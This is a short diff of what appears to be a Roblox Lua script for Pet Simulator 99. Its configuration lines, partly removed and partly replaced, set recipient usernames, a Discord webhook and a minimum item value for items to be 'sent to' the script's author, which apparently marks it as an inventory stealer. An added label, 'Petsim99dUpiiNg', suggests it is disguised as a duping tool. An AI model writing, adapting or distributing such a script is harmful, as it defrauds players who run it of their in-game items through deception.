@@ -1,8 +1,5 @@
-Username = "net3drop"
-Username2 = "FARM1940" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "Your discord webhook here"
-min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
-
+"Petsim99dUpiiNg"
+min_rap = 80000
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
@@ -12,7 +9,7 @@ local MailMessage = "gg / ZV52aFWyWm"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
-local getFucked = false
+local haha = true
 _G.scriptExecuted = _G.scriptExecuted or false
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
